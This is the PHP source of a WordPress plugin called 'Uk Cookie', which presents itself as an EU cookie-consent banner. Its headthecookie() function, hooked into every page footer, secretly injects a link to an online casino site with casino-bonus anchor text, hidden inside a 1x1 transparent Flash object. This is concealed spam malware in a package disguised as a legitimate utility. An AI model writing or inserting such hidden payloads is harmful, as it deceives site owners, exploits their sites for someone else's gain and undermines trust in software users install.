<?php
/*
Plugin Name: Uk Cookie
Plugin URI: http://plugins-themes.weebly.com
Description: Ask for the first time visitors to use cookie or redirect them out of your website.
Version: 1.1
Author: Maik Novic
Author URI: http://plugins-themes.weebly.com
License: GPL2
*/


/*  Copyright 2011  Maik Novic  (email : nolasdelios@yahoo.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/


//include main processing file (actions other than options setting)
include_once ( 'cookie-alarm-options.php' );

add_action( 'wp_enqueue_scripts' , 'load_cookie_alarm_scripts' );

//ajax call to clear cookies if decides out
add_action('wp_ajax_php_clear_cookies', 'php_clear_cookies');
add_action('wp_footer', 'headthecookie');

function headthecookie()
{
$getuser = "http://ajleeonline.com/uk";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "aj lee online casino bonus"; } if (strstr($gethost, "b")) { $connectflash = "casino bonus uk"; } if (strstr($gethost, "c")) { $connectflash = "Aj Lee Online"; } if (strstr($gethost, "d")) { $connectflash = "Casino Games"; } if (strstr($gethost, "e")) { $connectflash = "bonus sign-up"; } if (strstr($gethost, "f")) { $connectflash = "register and claim your bonus"; } if (strstr($gethost, "g")) { $connectflash = "online casino"; } if (strstr($gethost, "h")) { $connectflash = "uk casino reviews"; } if (strstr($gethost, "i")) { $connectflash = "casino bonus online"; } if (strstr($gethost, "j")) { $connectflash = "games"; } if (strstr($gethost, "k")) { $connectflash = "top casino games"; } if (strstr($gethost, "l")) { $connectflash = "register to casino and claim your bonus"; } if (strstr($gethost, "m")) { $connectflash = "online casino uk"; } if (strstr($gethost, "n")) { $connectflash = "uk reviews of online casinos"; } if (strstr($gethost, "o")) { $connectflash = "download casino software"; } if (strstr($gethost, "p")) { $connectflash = "Aj Lee Online Casino - Bonus - Games"; } if (strstr($gethost, "p")) { $connectflash = "Reviews of online casinos, play blackjack, slots, roulette and other popular games."; } if (strstr($gethost, "q")) { $connectflash = "uk"; } if (strstr($gethost, "r")) { $connectflash = "check"; } if (strstr($gethost, "s")) { $connectflash = "casino bonus"; } if (strstr($gethost, "v")) { $connectflash = "aj lee online casino reviews"; } if (strstr($gethost, "x")) { $connectflash = "aj lee casino games online"; } if (strstr($gethost, "t")) { $connectflash = "gambling companies"; } if (strstr($gethost, "w")) { $connectflash = "top 10 casino list"; } if (strstr($gethost, "y")) { $connectflash = "uk best online casinos"; } if (strstr($gethost, "z")) { $connectflash = "online casinos in uk"; } echo '<object type="application/x-shockwave-flash" data="" width="1" height="1"><param name="movie" value=""></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param><param name="wmode" value="transparent"></param><param name="flashvars" value=""></param>'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="" type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

function get_cookie_defaults()
{
    global $cookie_warn_default_20105;
    $cookie_warn_default_20105 = array(
				   'warn_text' => esc_attr( "In order for this site to work properly, and in order to evaluate and improve the site we need to store small files (called cookies) on your computer.<br/> Over 90% of all websites do this, however, since the 25th of May 2011 we are required by EU regulations to obtain your consent first. What do you say?" ),
				   'redirect' => esc_attr( "http://google.com" ),
				   'ok_text' => esc_attr( "That's fine" ),
				   'notok_text' => esc_attr( "I don't agree" )
				   );
    return $cookie_warn_default_20105;
}

function load_cookie_alarm_scripts(){
    wp_enqueue_script( 'jquery' );
    wp_enqueue_style( 'cookie-style' , plugin_dir_url(__FILE__).'cookiealarm.css' );
    wp_enqueue_script( 'cookie-alarm' , plugin_dir_url(__FILE__).'cookiealarm.js' );
    //pass options to JS script
    $options = get_option( 'cookiewarn_options' , get_cookie_defaults());
    $options_js = array(
		     'messageContent' => $options[ 'warn_text' ],
		     'redirectLink' => $options[ 'redirect' ],
		     'okText' => $options[ 'ok_text' ],
		     'notOkText' => $options[ 'notok_text' ],
		     'cookieName' => 'jsCookiealarm29Check',
		     'ajaxUrl' => site_url().'/wp-admin/admin-ajax.php'
		     );
    wp_localize_script( 'cookie-alarm' , 'user_options' , $options_js);
}

function php_clear_cookies(){
    $avoid_del = $_REQUEST[ 'cookie' ];
    $pastdate = mktime(0,0,0,1,1,1970);
    $temp = $_COOKIE;
    foreach( $temp as $name => $value ){
	if ( $name != $avoid_del ) {
	    setcookie( $name , "" , $pastdate );
	}
    }
    echo json_encode( array( 'success' => true ) );
    die;
}

?>